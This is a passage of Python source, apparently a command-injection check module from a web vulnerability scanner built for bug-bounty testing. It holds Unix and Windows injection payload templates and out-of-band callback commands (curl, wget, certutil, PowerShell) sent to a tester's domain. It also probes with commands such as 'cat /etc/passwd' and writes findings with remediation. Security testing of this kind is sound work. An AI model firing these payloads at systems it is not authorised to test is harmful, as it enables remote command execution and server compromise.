    vuln_class = "OS Command Injection"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    bugcrowd_vrt_category = "Injection > OS Command Injection"

    # PortSwigger-style command injection payloads
    UNIX_PAYLOADS = [
        # Basic separators
        "; {cmd}",
        "`{cmd}`",
        "$({cmd})",
        "|| {cmd}",
        "&& {cmd}",
        "| {cmd}",
        "\n{cmd}\n",
        # Subshell
        "$({cmd})",
        "`{cmd}`",
        # Background execution
        "{cmd} &",
        "({cmd}) &",
        # Command substitution in various contexts
        "';{cmd};'",
        '";{cmd};"',
        "`{cmd}`",
        "$({cmd})",
        # Newline variations
        "%0a{cmd}%0a",
        "%0d{cmd}%0d",
        "%0a{cmd}%0d",
        # Newline with different encodings
        "${IFS}{cmd}",
        "{cmd};",
        "|{cmd}",
    ]

    WINDOWS_PAYLOADS = [
        "& {cmd}",
        "| {cmd}",
        "&& {cmd}",
        "|| {cmd}",
        "^ {cmd}",
        "%0a {cmd}",
        "%0d {cmd}",
        "&& {cmd} &&",
        "|| {cmd} ||",
        "; {cmd}",
        "`{cmd}`",
        "%2b{cmd}%2b",
    ]

    # OOB commands for blind detection
    OOB_COMMANDS = {
        "unix": [
            "nslookup {token}.{domain}",
            "dig {token}.{domain}",
            "host {token}.{domain}",
            "curl http://{token}.{domain}",
            "wget http://{token}.{domain}",
            "ping -c 1 {token}.{domain}",
        ],
        "windows": [
            "nslookup {token}.{domain}",
            "ping -n 1 {token}.{domain}",
            "certutil -urlcache -split -f http://{token}.{domain}",
            "powershell -c \"Invoke-WebRequest http://{token}.{domain}\"",
        ],
    }

    def applies_to(self, endpoint: Endpoint) -> bool:
        return bool(endpoint.params) and endpoint.method in ("GET", "POST")

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []
        if not self.oob_server:
            return findings

        for param in endpoint.params:
            # Test with OOB commands
            token = self.oob_server.generate_token()

            for os_type, payloads in [("unix", self.UNIX_PAYLOADS), ("windows", self.WINDOWS_PAYLOADS)]:
                for oob_cmd in self.OOB_COMMANDS.get(os_type, []):
                    cmd = oob_cmd.format(token=token, domain=self.oob_server.domain)

                    for payload_template in payloads:
                        payload = payload_template.format(cmd=cmd)
                        finding = await self._test_payload(endpoint, param, payload, token, os_type)
                        if finding:
                            findings.append(finding)
                            break
                    if findings:
                        break
                if findings:
                    break

            # Also test with output-based detection (if no OOB)
            if not findings:
                for os_type, payloads in [("unix", self.UNIX_PAYLOADS), ("windows", self.WINDOWS_PAYLOADS)]:
                    test_cmds = ["id", "whoami", "cat /etc/passwd", "type C:\\windows\\win.ini"]
                    for test_cmd in test_cmds:
                        for payload_template in payloads[:5]:  # Test basic separators
                            payload = payload_template.format(cmd=test_cmd)
                            finding = await self._test_output_based(endpoint, param, payload, test_cmd, os_type)
                            if finding:
                                findings.append(finding)
                                break
                        if findings:
                            break
                    if findings:
                        break

        return findings

    async def _test_payload(self, endpoint: Endpoint, param: str, payload: str, token: str, os_type: str) -> Optional[Finding]:
        test_url = endpoint.with_param(param, payload)

        control = await self._fetch(endpoint.url)
        test = await self._fetch(test_url)

        if not test:
            return None

        validation = await Validator.oob_callback_received(self.oob_server, token, timeout=15)
        if validation.confirmed:
            return self._make_finding(
                endpoint=endpoint,
                param=param,
                confidence="confirmed",
                evidence={
                    "payload": payload,
                    "type": "oob_command_injection",
                    "os_type": os_type,
                    "token": token,
                    "callback": validation.evidence.get("callback"),
                    "request_url": test_url,
                },
                summary=f"OS Command Injection in parameter '{param}' ({os_type}, OOB confirmed)",
                description=(
                    f"The parameter '{param}' passes user input directly to a system shell. "
                    f"An OOB DNS/HTTP callback confirms arbitrary command execution on {os_type}."
                ),
                steps_to_reproduce=(
                    f"1. Send payload: {payload}\n"
                    f"2. Observe callback to {token}.{self.oob_server.domain}"
                ),
                impact="Full server compromise via arbitrary command execution.",
                remediation="Avoid shell commands with user input. Use subprocess with args array. Validate/sanitize input. Use allowlists.",
            )
        return None

    async def _test_output_based(self, endpoint: Endpoint, param: str, payload: str, cmd: str, os_type: str) -> Optional[Finding]:
        test_url = endpoint.with_param(param, payload)
        test = await self._fetch(test_url)

        if not test:
            return None

        # Check for command output in response
        output_indicators = {
            "unix": ["uid=", "gid=", "root:", "bin/bash", "bin/sh", "/etc/passwd", "/etc/shadow", "groups="],
            "windows": ["administrator", "system32", "windows\\win.ini", "program files", "cmd.exe", "users\\"],
        }

        indicators = output_indicators.get(os_type, [])
        body = test.get("body", "")

        for indicator in indicators:
            if indicator in body:
                return self._make_finding(
                    endpoint=endpoint,
                    param=param,
                    confidence="confirmed",
                    evidence={
                        "payload": payload,
                        "type": "output_based_command_injection",
                        "os_type": os_type,
                        "command": cmd,
                        "indicator_found": indicator,
                        "response_body_snippet": body[:500],
                        "request_url": test_url,
                    },
                    summary=f"OS Command Injection in parameter '{param}' ({os_type}, output-based)",
                    description=(
                        f"The parameter '{param}' passes user input directly to a system shell. "
                        f"Command output ({indicator}) was found in the response."
                    ),
                    steps_to_reproduce=(
                        f"1. Send payload: {payload}\n"
                        f"2. Observe command output in response"
                    ),
                    impact="Full server compromise via arbitrary command execution.",
                    remediation="Avoid shell commands with user input. Use subprocess with args array. Validate/sanitize input. Use allowlists.",
                )
        return None

    async def _fetch(self, url: str) -> Optional[Dict[str, Any]]:
        try:
            resp = await self.http_client.get(url, timeout=settings.REQUEST_TIMEOUT)
            return {"status": resp.status_code, "body": resp.text}
        except Exception:
            return None